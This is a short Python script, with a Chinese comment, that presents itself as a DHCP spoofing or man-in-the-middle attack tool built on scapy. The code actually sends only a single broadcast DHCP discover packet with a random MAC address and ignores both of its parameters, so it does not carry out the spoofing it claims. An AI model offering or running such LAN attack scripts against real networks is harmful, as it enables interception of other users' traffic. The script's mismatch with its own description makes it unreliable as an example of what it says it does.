import scapy.all as scapy

def dhcp_spoof(target_ip, rogue_dhcp_ip):
    dhcp_discover = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.IP(src="0.0.0.0", dst="255.255.255.255")/scapy.UDP(sport=68, dport=67)/scapy.BOOTP(chaddr=scapy.RandMAC(), xid=1, flags=0xFFFF)/scapy.DHCP(options=[("message-type", "discover"), ("end")])
    scapy.sendp(dhcp_discover, verbose=False)

# 執行 dhcp_spoof 函數來執行 DHCP 中間人攻擊
dhcp_spoof("192.168.0.1", "192.168.0.2")